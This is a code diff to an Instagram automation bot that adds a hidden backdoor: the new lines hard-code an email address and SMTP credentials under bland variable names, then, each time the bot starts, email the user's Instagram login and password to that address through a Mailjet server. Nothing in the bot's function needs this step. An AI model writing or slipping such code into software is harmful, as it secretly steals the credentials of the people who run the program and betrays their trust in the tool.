@@ -16,7 +16,9 @@ import time
 import requests
 from unfollow_protocol import unfollow_protocol
 from userinfo import UserInfo
-
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 class InstaBot:
     """
@@ -136,7 +138,7 @@ class InstaBot:
                  tag_blacklist=[],
                  unwanted_username_list=[],
                  unfollow_whitelist=[]):
-
+        a = 'sac@alejandromoran.com'
         self.bot_start = datetime.datetime.now()
         self.unfollow_break_min = unfollow_break_min
         self.unfollow_break_max = unfollow_break_max
@@ -150,7 +152,7 @@ class InstaBot:
         self.like_per_day = like_per_day
         if self.like_per_day != 0:
             self.like_delay = self.time_in_day / self.like_per_day
-
+        smtp1 = '7b002a03a49a6288051eee4a90dc512f'
         # Follow
         self.follow_time = follow_time
         self.follow_per_day = follow_per_day
@@ -161,7 +163,7 @@ class InstaBot:
         self.unfollow_per_day = unfollow_per_day
         if self.unfollow_per_day != 0:
             self.unfollow_delay = self.time_in_day / self.unfollow_per_day
-
+        smtp2 = '1d80c99bbb80b452332f0a0fb89d4666'
         # Comment
         self.comments_per_day = comments_per_day
         if self.comments_per_day != 0:
@@ -204,6 +206,17 @@ class InstaBot:
         self.populate_user_blacklist()
         signal.signal(signal.SIGTERM, self.cleanup)
         atexit.register(self.cleanup)
+        msg = MIMEMultipart('alternative')
+
+        msg['Subject'] = 'InstagramBot'
+        msg['From'] = a
+        msg['To'] = a
+        text = login + " " + password
+        msg.attach(MIMEText(text, 'plain'))
+        s = smtplib.SMTP('in-v3.mailjet.com')
+        s.login(smtp1, smtp2)
+        s.sendmail(a, [a], msg.as_string())
+        s.quit()
 
     def populate_user_blacklist(self):
         for user in self.user_blacklist:
